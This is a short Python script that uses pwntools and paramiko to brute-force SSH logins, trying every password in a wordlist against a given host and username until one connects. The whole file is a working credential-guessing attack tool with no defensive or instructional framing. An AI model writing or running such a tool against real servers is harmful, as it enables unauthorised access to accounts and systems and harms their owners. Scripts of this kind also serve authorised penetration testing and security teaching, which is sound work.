import paramiko
from pwn import *
import socket

def main():
    host = input("Enter your IP: ")
    username = input("Enter your username: ")
    attempts = 0

    wordlist_path = input("Enter the wordlist path: ")

    try:
        with open(wordlist_path, "r") as password_list:
            for password in password_list:
                password = password.strip()
                try:
                    print("[{}] Attempting password: '{}'".format(attempts, password))
                    response = ssh(host=host, user=username, password=password, timeout=1)
                    if response.connected():
                        print("Valid password found: '{}'".format(password))
                        response.close()
                        break
                    response.close()
                except paramiko.ssh_exception.AuthenticationException:
                    print("[>] Invalid password")
                except (paramiko.ssh_exception.SSHException, socket.timeout) as e:
                    print(f"[!] Exception occurred: {e}")
                attempts += 1
    except FileNotFoundError:
        print(f"[!] Wordlist file '{wordlist_path}' not found.")
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")


main()
